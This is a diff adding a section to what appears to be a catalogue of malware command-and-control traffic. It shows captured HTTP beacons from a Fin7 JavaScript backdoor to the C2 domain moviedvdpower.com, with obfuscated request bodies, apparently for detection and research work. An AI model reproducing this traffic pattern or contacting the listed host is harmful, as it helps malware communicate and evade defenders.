@@ -337,6 +337,39 @@ kyMjI5loUABYmLgimiKQCLDyklKqUpqSoqpjBAMjIw==
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/exilerat.png "Exilerat")
 
+#### Fin7 JS Backdoor
+~~~
+POST /pictures/delete?type=name HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/50.0
+Content-Length: 326
+Host: moviedvdpower.com
+
+lwirwavfynacqo=PKWFG%04S@XZ%16l%04%0E%00%02%00f%09%02%06%09%1EAC%04%0D%02%05%1FKVTK%5DG%0AX%08%07%0F%0D%00W%05%5B%5DQ%05%0D%0AV%0F%0B%5B%0B%03%0E%0FP%03%0B%01%06%0E%0C%5D%06V%1FLZZ%5C%05%02%05%09%08%03%07%1FMZS%04%0E%01%05%1FQW%0A%0C%0A%09%02%0D%02%03%07%03%0Cr%0Dx%7C%09%05%08gfD%5CJ%1Egz%1ECV%5E%5Dl%5E%5D%05%5DRN%26_%267983
+
+HTTP/1.1 200 OK
+Server: nginx/1.12.2
+Date: Tue, 15 Oct 2019 16:27:41 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 0
+Connection: keep-alive
+
+POST /new/new?type=name HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/50.0
+Content-Length: 306
+Host: moviedvdpower.com
+
+lwirwavfynacqo=PG_EG%08%5BCXV%1Eo%04%02%08%01%00j%01%01%06%05%16BC%08%05%01%05%13CUTGUD%0AT%00%04%0F%01%08T%05WUR%05%01%02U%0F%07S%08%03%02%07S%03%07%09%05%0E%00U%05V%13DYZP%0D%01%05%05%00%00%07%13EYS%08%06%02%05%13YT%0A%00%02%0A%02%01%0A%00%07%0F%04q%0Dtt%0A%05%04oeDPB%1Dgv%16@VRUo%5EQ%0D%5ERB%26_%267500
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/fin7jsbackdor.png "Fin7 JS Backdoor"
+
 #### Flawedammyy
 ~~~
 = ..">h..K...t.......N<.
